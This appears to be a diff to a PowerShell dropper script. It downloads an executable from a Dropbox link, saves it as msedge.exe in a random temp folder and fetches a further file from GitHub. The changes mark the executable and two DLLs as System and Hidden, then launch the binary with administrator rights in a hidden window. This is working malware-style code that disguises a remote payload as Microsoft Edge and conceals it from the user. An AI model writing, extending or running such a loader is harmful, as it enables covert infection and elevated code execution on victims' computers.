@@ -4,6 +4,14 @@ start-sleep 10
 #change directory
 cd $env:temp/sVBXKuz
 
+$filePath = "$env:temp/sVBXKuz/msedge.exe"
+$dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
+$dll2Path = "$env:temp/sVBXKuz/libopus.dll"
+
+Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::Normal)
+Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::Normal)
+Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::Normal)
+
 #download new file
 Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/i7cu35v7bj3fvfbk3bbp6/wsappa-2.0.exe?rlkey=j3rap110tv6br11xo3359uos1&dl=0" -OutFile msedge_new.exe
 Copy-Item -Path .\msedge_new.exe -Destination .\msedge.exe -Force
@@ -19,10 +27,9 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/m
 start-sleep 2
 
 
-# Set "Hidden" attribute on the file
-$filePath = Join-Path $env:temp\sVBXKuz "msedge.exe"
-$attr = [System.IO.FileAttributes]::Hidden
-[System.IO.File]::SetAttributes($filePath, $attr)
+Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 
 #start new file
 Start-Process -FilePath "$env:temp/sVBXKuz/msedge.exe" -Verb RunAs -WindowStyle Hidden
